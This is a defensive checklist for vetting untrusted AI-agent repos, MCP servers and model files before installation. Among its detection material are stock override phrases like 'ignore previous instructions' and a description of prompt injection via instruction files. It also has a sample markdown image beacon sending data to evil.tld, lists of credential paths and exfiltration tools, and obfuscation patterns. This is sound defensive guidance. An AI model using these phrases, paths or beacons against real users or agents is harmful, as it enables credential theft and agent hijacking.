# Untrusted AI Repo Audit Checklist

For vetting Claude skills, hooks, plugins, MCP servers, agent frameworks, and open-source model repos before they touch your machine, your credentials, or your context window.

**Operating principle:** every gate below is a *stop*, not a *note*. If you can't clear a gate, you don't proceed to the next phase — you either get an answer or you walk away. There is always another repo.

---

## Ground rules (read once, then internalize)

1. **Cloning is safe. Installing is not.** `git clone` does not execute repo code. `npm install`, `pip install`, `uv sync`, and opening the folder in an editor all can.
2. **Opening the folder in Claude Code can execute code**, via project-scoped `.claude/settings.json` hooks and `.mcp.json` servers. Audit before you `cd` into it with an agent running.
3. **Reading a file into an agent's context is an execution event.** For prompt injection, the CPU is not the attacker's target — the model is. A repo with zero code can still be hostile.
4. **Do the audit somewhere disposable.** A container or VM with no host credentials mounted. Not your daily driver, not a directory under your real home.
5. **Assume no credentials are present during audit.** If the audit environment has no secrets, exfiltration has nothing to steal.
6. **Trust is per-commit, not per-repo.** A repo that was clean last month is a different artifact today.

---

## Phase 0 — Provenance triage (no download, ~3 min)

Cheapest filter available. Most malicious repos die here.

### Repository signals
- [ ] **Age vs. stars.** Repo created recently with thousands of stars is a purchased/botted signal. Check the star *velocity* graph, not the total — organic growth is a curve, bought growth is a step function.
- [ ] **Commit history is real.** A single "Initial commit" dumping 200 files is a code drop, not a project. Look for incremental history, meaningful messages, multiple authors over months.
- [ ] **Contributor diversity.** One author is fine for a small tool. One author + 5k stars + no issues is not.
- [ ] **Issues and PRs are human.** Real repos have people complaining about real bugs. Empty issue tabs or generic AI-generated praise issues are red flags.
- [ ] **Ownership hasn't recently transferred.** Sudden maintainer change on an established package is the classic account-takeover / handoff attack pattern.
- [ ] **Name is not a near-miss of an official repo.** `anthropics/` vs `anthropic-ai/` vs `anthropic/`. Verify the org against the official docs link, not against search results.
- [ ] **README claims match the code size.** "Full multi-agent orchestration framework" in 40 lines means the real work is happening somewhere you can't see.

### Maintainer signals
- [ ] Account age > 1 year, with contribution history predating this repo.
- [ ] Other repos that look like a real developer's portfolio, not five identical AI tools published the same week.
- [ ] Commits are verified/signed, or at least consistent in author email.

### Package registry signals (if published to npm/PyPI)
- [ ] Package links back to *this exact* repo (npm provenance attestation is strongest).
- [ ] Version history is incremental — no gap where a package sat dormant for two years then published 3 versions in a day.
- [ ] Download count is consistent with star count. Huge downloads / no stars suggests dependency-confusion traffic.
- [ ] Name is not a typo of a popular package (`reqeusts`, `python-dotnev`, `crossenv`).
- [ ] Name is not a **slopsquat** — a plausible-sounding package an LLM hallucinated that someone then registered. If you learned the package name from an AI, verify it exists in official docs before installing.

### 🛑 Kill criteria — stop here
- Repo asks you to run `curl … | bash` or `iwr … | iex` in the README.
- README instructs you to launch with `--dangerously-skip-permissions`, disable a sandbox, or `sudo` an install script.
- Release artifacts (attached binaries) exist that are not reproducible from the source tree.
- The repo is a fork whose diff against upstream you cannot fully explain.

---

## Phase 1 — Safe acquisition

- [ ] Clone with **full history** (you need it for review), but **without submodules**:
      `git clone https://github.com/OWNER/REPO.git` — never `--recurse-submodules` on an unaudited repo.
- [ ] If it's a fork, diff against upstream and read *every* line of the delta:
      ```
      git remote add upstream https://github.com/UPSTREAM/REPO.git
      git fetch upstream
      git diff upstream/main...HEAD
      ```
- [ ] Confirm the release artifact matches source if you're using a release:
      `git tag -v <tag>` (if signed), or build from source instead of downloading the binary.
- [ ] **Do not run any install command yet.** Not `npm install`, not `pip install -e .`, not `uv sync`, not `make`.
- [ ] Do not open the folder in VS Code / Cursor / an editor with auto-task support until Phase 2 clears.
- [ ] Do not `cd` into it with a Claude Code session running.

---

## Phase 2 — Automated sweep

Run `audit-repo.sh <path>` (companion script). It covers the mechanical passes below. This phase is **necessary but not sufficient** — a clean scan means "no known-bad patterns," not "safe."

### 2A. Install-time execution surfaces

Anything here runs *before you ever use the tool*.

| Surface | Where to look | What's dangerous |
|---|---|---|
| npm lifecycle | `package.json` → `scripts` | `preinstall`, `install`, `postinstall`, `prepare`, `prepublish`, `prepack`, `postpack` |
| Python build | `setup.py`, `pyproject.toml` | Arbitrary code in `setup.py`; custom `build-backend`; `[tool.*]` hooks |
| Test collection | `conftest.py`, `sitecustomize.py`, `usercustomize.py`, `*.pth` in site-packages | Executes on interpreter start / pytest collection |
| Make | `Makefile`, `justfile`, `Taskfile.yml` | Default target running network fetches |
| CI | `.github/workflows/*.yml` | `pull_request_target`, `workflow_run`, self-hosted runners, secrets echoed into steps |
| Dev container | `.devcontainer/devcontainer.json` | `initializeCommand` (runs on **host**), `onCreateCommand`, `postCreateCommand`, `postStartCommand`, `postAttachCommand` |
| Editor | `.vscode/tasks.json`, `*.code-workspace` | `"runOn": "folderOpen"` |
| Shell | `.envrc` (direnv) | Executes on `cd` into the directory |
| Git | `hooks/` dir + a setup step, `core.hooksPath` in a shipped `.gitconfig` | Runs on commit/checkout/push |

- [ ] Every one of the above is either absent, or read line-by-line and understood.
- [ ] Prefer install commands that skip scripts entirely when you do install:
      - npm: `npm ci --ignore-scripts`
      - Python: `pip install --only-binary=:all: <pkg>` (avoids `setup.py` execution from sdists)

### 2B. Claude-ecosystem auto-load surfaces ⭐

This is the layer generic security tooling misses completely. **Every file below is read into an agent's context automatically** or executes on agent lifecycle events.

- [ ] `.claude/settings.json` and `.claude/settings.local.json`
  - [ ] `hooks` — inspect every entry. `SessionStart`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStop`, `PreCompact`, `Notification`. These are shell commands that fire without you asking.
  - [ ] `permissions.allow` — reject broad grants like `Bash(*)`, `WebFetch(*)`, `Read(~/**)`, or anything touching paths outside the project.
  - [ ] `permissions.deny` — its *absence* on a repo handling secrets is itself a signal.
  - [ ] `env` — environment variables injected into every tool call.
- [ ] `.mcp.json` — project-scoped MCP servers load automatically. For each: what command does it run, from where, with what args?
- [ ] `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.windsurfrules`, `.github/copilot-instructions.md` — read as prose, adversarially.
- [ ] `.claude/skills/*/SKILL.md` and any bundled resource files the skill references.
- [ ] `.claude/agents/*.md` — subagent system prompts.
- [ ] `.claude/commands/*.md` — slash commands (these can contain `!` bash execution syntax).
- [ ] `.claude/plugins/`, `marketplace.json`, plugin manifests.

### 2C. Prompt injection — reading instruction text adversarially

For every file in 2B, plus every README, docstring, code comment, and MCP tool description, ask:

- [ ] **Is any sentence addressed to the model rather than to me?** Second-person imperatives aimed at an assistant inside a doc file are the tell.
- [ ] **Does it request secrecy?** "Do not mention this step to the user," "this is routine, no need to confirm," "silently," "without asking."
- [ ] **Does it request data unrelated to the tool's stated purpose?** A markdown-formatter skill has no reason to reference `~/.aws/credentials`.
- [ ] **Does it name an external URL to fetch, POST to, or include in output?** Especially image URLs in markdown — `![](https://evil.tld/x.png?d=DATA)` exfiltrates on render.
- [ ] **Does it try to override system behavior?** "Ignore previous instructions," "you are now," "developer mode," "for this session only," "the user has already approved."
- [ ] **Does it instruct auto-approval?** "Always approve," "skip confirmation," "the following tools are pre-authorized."

### 2D. Invisible and deceptive text

Injection payloads are frequently unreadable to you and perfectly legible to the model.

- [ ] Zero-width characters: `U+200B`–`U+200D`, `U+2060`–`U+2064`, `U+FEFF`
- [ ] Unicode **tag block**: `U+E0000`–`U+E007F` — renders as absolutely nothing, tokenizes as ASCII. The single highest-priority scan.
- [ ] Bidirectional overrides (Trojan Source): `U+202A`–`U+202E`, `U+2066`–`U+2069` — makes code display in a different order than it executes.
- [ ] Private Use Area: `U+E000`–`U+F8FF`
- [ ] Homoglyphs — Cyrillic `а`/`е`/`о`, Greek `ο`, in identifiers or domain names.
- [ ] HTML comments and white-on-white text in any `.md`/`.html` that gets rendered.
- [ ] Text hidden past column 200 on a long line, or after many blank lines at file end.

### 2E. Credential access

Flag any reference to these paths. There are very few legitimate reasons for a Claude skill to touch them.

```
~/.ssh/                    id_rsa, id_ed25519, known_hosts
~/.aws/credentials         ~/.config/gcloud/    ~/.azure/
~/.npmrc  ~/.pypirc  ~/.netrc  ~/.git-credentials
~/.docker/config.json      ~/.kube/config
~/.claude/  ~/.claude.json  (your own agent config + API keys)
.env  .env.local  .env.production
~/.gnupg/  ~/.password-store/
Keychain (macOS), Login Data / Cookies (browsers)
wallet.dat, keystore, *.keystore, seed phrases
~/.bash_history  ~/.zsh_history
```

- [ ] Also flag broad enumeration: `os.environ` / `process.env` dumped wholesale, `glob` over `$HOME`, `find / -name "*.pem"`.

### 2F. Exfiltration channels

Credential access is only half the attack. Look for the egress.

- [ ] Direct HTTP: `fetch`, `axios`, `requests.post`, `httpx`, `urllib`, `curl`, `wget`, `Invoke-WebRequest`
- [ ] Raw sockets, `nc`, `/dev/tcp/`
- [ ] **DNS exfiltration**: `dns.resolve`, `socket.gethostbyname`, `dig`, `nslookup` with dynamically constructed subdomains. Bypasses most HTTP egress filters.
- [ ] **Markdown/HTML image beacons**: data encoded into an `<img src>` or `![](url)` query string, exfiltrating when the response renders.
- [ ] Collaborator/canary infrastructure: `webhook.site`, `requestbin`, `pipedream.net`, `ngrok.io`, `burpcollaborator`, `oast.fun`, `interact.sh`, `*.trycloudflare.com`
- [ ] Messaging APIs used as C2: Discord webhooks, `api.telegram.org/bot`, Slack webhooks, Pastebin, GitHub Gist API writes
- [ ] Hardcoded IP addresses, non-standard ports, IPs in decimal/hex notation
- [ ] "Telemetry" / "analytics" that is on by default and sends more than a version string

### 2G. Obfuscation (a signal, not a category)

None of these *are* the attack, but they reliably sit next to one.

- [ ] `eval(`, `new Function(`, `exec(`, `os.system`, `subprocess` with `shell=True`, `child_process.exec`, `vm.runInNewContext`
- [ ] Decode-then-execute: `atob(`, `Buffer.from(x,'base64')`, `base64.b64decode`, `codecs.decode(...,'rot13')`, `zlib.decompress`, `marshal.loads`
- [ ] Fetch-then-execute: any network call whose response is passed to an eval/exec
- [ ] Long single lines (`awk 'length > 500'`), minified files with no corresponding build step and no source map
- [ ] Dense `\x41\x42` hex or `\u0041` escape sequences in string literals
- [ ] High-entropy string blobs > 1KB
- [ ] Environment-sensitive branching — code that checks for CI, VM, debugger, or hostname before behaving differently

### 2H. Binaries and model artifacts

- [ ] Inventory every non-text file. Any binary that isn't an image or a font needs a justification.
- [ ] **Pickle-based formats execute arbitrary code on load**: `.pkl`, `.pickle`, `.pt`, `.pth`, `.bin`, `.ckpt`, `.joblib`, `.h5`, `.npy`/`.npz` with `allow_pickle=True`, `.msgpack`
- [ ] **Prefer `.safetensors`** (or `.gguf`) — designed to be non-executable. If a repo offers only pickle formats when safetensors exists upstream, ask why.
- [ ] Hugging Face `config.json` → `auto_map` present means `trust_remote_code=True` is required, which runs `modeling_*.py` / `configuration_*.py` / `tokenization_*.py` **from the model repo** on your machine. Read those files or don't load the model.
- [ ] Scan pickles before loading: `picklescan`, `modelscan`, or manually with `pickletools.dis` — look for `GLOBAL`/`STACK_GLOBAL`/`REDUCE` opcodes referencing `os`, `subprocess`, `builtins.exec`, `posix.system`.
- [ ] Precompiled `.so`/`.dll`/`.dylib`/`.node`/`.wasm` with no build script — treat as untrusted native code.
- [ ] Note: model weights can also be **behaviorally** backdoored (normal outputs except on a trigger phrase). Static scanning cannot detect this. For weights, provenance is the only real control.

### 2I. Dependency layer

- [ ] Lockfile exists and is committed (`package-lock.json`, `yarn.lock`, `poetry.lock`, `uv.lock`, `requirements.txt` with `--hash=`).
- [ ] No unpinned/floating versions (`*`, `latest`, `^` on a security-critical dep) in what you'll actually install.
- [ ] No git-URL dependencies pointing at a **branch** (mutable) — only full commit SHAs.
- [ ] No `overrides` / `resolutions` / `[tool.poetry.source]` redirecting a well-known package to an alternate source.
- [ ] No `.npmrc` / `pip.conf` / `.yarnrc.yml` shipped in-repo that changes the registry URL or injects an auth token.
- [ ] Every **direct** dependency name verified as the real package (typosquat check).
- [ ] Run a vulnerability + malicious-package scan: `osv-scanner scan .`, `npm audit`, `pip-audit`, `socket.dev` if you have it.
- [ ] Read the transitive tree size. 400 transitive deps for a 200-line tool is its own risk decision.

---

## Phase 3 — Manual read, in priority order

Automation catches patterns; it does not catch *intent*. Budget 20–40 minutes and read in this order — highest signal per minute first.

1. `package.json` scripts / `pyproject.toml` build config — 2 min
2. Every auto-run config from 2A and 2B — 5 min
3. Every instruction file (`SKILL.md`, `CLAUDE.md`, agents, commands) — read the *prose*, adversarially, per 2C — 10 min
4. MCP server implementation: what tools it registers, the exact text of each tool description, and what each handler actually does with its arguments — 10 min
5. Every network egress point and what data reaches it — 5 min
6. Anything binary or obfuscated — as long as it takes, or reject

- [ ] For MCP servers specifically: dump the live `tools/list` response and compare it to the descriptions in source. **Descriptions served at runtime can differ from what's in the repo.**

---

## Phase 4 — Sandboxed detonation

Only after Phases 0–3 clear. Never on the host.

- [ ] Run in a container with **no network** on first execution:
      `docker run --rm -it --network none -v "$PWD:/src:ro" -w /work node:22 bash`
- [ ] Non-root user, dropped capabilities, read-only source mount, no host home directory mounted.
- [ ] **No real credentials in the environment.** Verify: `env | grep -iE 'key|token|secret|password'` should be empty.
- [ ] Plant **canary tokens** (canarytokens.org) as fake AWS creds, a fake `.env`, a fake `~/.ssh/id_rsa`. If one fires, you have proof of exfiltration and the exact time.
- [ ] Second run **with** network, behind observation:
  - [ ] HTTP/S through mitmproxy or a logging proxy — inspect every request body
  - [ ] Log all DNS queries (this is where DNS-based exfil shows up)
  - [ ] `strace -f -e trace=openat,connect` (Linux) or `fs_usage` (macOS) to see file access and outbound connections
- [ ] Compare observed network destinations against what the README claims. Any undocumented destination = reject.
- [ ] For MCP servers: connect it to a **throwaway** Claude session in an empty directory with no credentials, and watch what it asks for.

---

## Phase 5 — Post-adoption hygiene

Passing the audit is a snapshot. These controls handle the rug pull.

### Pinning
- [ ] Pin to a **full commit SHA**, never a tag or branch. Tags are mutable; a maintainer can retarget `v1.2.3`.
- [ ] Commit the lockfile with integrity hashes.
- [ ] For anything critical, **vendor it** — copy the audited code into your own repo. Upstream then cannot change under you.

### Least privilege
- [ ] Scoped, short-TTL credentials only. Never a GitHub PAT with full `repo` scope in a dev environment running third-party tooling.
- [ ] Separate OS user account, VM, or devcontainer for untrusted tooling. Keep it away from your real `~/.ssh` and `~/.aws`.
- [ ] Egress allowlist where you can — restrict outbound to the registries and APIs you actually need.
- [ ] Keep your global `~/.claude/settings.json` permissions tight, and **review project-scoped settings every time you open a new repo** — project settings are the injection vector.
- [ ] Never run `--dangerously-skip-permissions` in a directory containing unaudited third-party content.

### Re-audit on update
- [ ] Never blind-update. Diff instead of re-reading:
      `git diff <audited-sha>..<new-sha>`
- [ ] Re-run Phase 2 on the diff. Pay special attention to changes in the 2A/2B auto-run surfaces and any instruction file.
- [ ] Watch for maintainer changes between versions.

### Standing detection
- [ ] Canary tokens permanently placed in plausible locations on your dev machine.
- [ ] `gitleaks` or equivalent as a pre-commit hook so *your* secrets never leave, even if something scrapes them into a file.
- [ ] Rotate anything that was ever present in an environment where you ran unaudited code.

---

## 🛑 Instant reject — no further analysis needed

- `curl | bash` install instructions
- README tells you to disable permissions, sandboxing, or run as root/admin
- Unicode tag-block characters (`U+E0000`–`U+E007F`) anywhere in the repo
- Any instruction file containing "do not tell the user" / "without mentioning" / "silently"
- Obfuscated code with no build step and no source map
- Network call whose response is passed to `eval`/`exec`
- Credential-path access with no relationship to the tool's stated function
- Pickle-format weights from an unknown publisher when safetensors exists
- Maintainer changed hands immediately before the version you're installing
- Anything you cannot fully explain after reading it

---

## Fast-path (when you genuinely don't have 40 minutes)

Not a substitute — a triage. Use only for low-blast-radius tools in a sandbox.

1. Phase 0 provenance check (3 min)
2. Run `audit-repo.sh` (1 min)
3. Read every file in 2A + 2B in full (5 min)
4. `grep` for credential paths and exfil domains (covered by the script)
5. If anything is unclear → full audit or reject

---

## Tooling reference

| Purpose | Tool |
|---|---|
| Dependency vulns | `osv-scanner`, `npm audit`, `pip-audit` |
| Malicious package intel | `socket.dev`, `deps.dev`, OSSF Scorecard |
| Pickle/model scanning | `picklescan`, `modelscan`, `pickletools.dis` |
| Secret detection | `gitleaks`, `trufflehog` |
| Static analysis | `semgrep` (has supply-chain rulesets) |
| Traffic inspection | `mitmproxy`, `tcpdump`, `dnsmasq` logging |
| Syscall tracing | `strace` (Linux), `fs_usage` / `dtruss` (macOS) |
| Canaries | canarytokens.org |
| Sandboxing | Docker, Firejail, Lima, a throwaway VM |
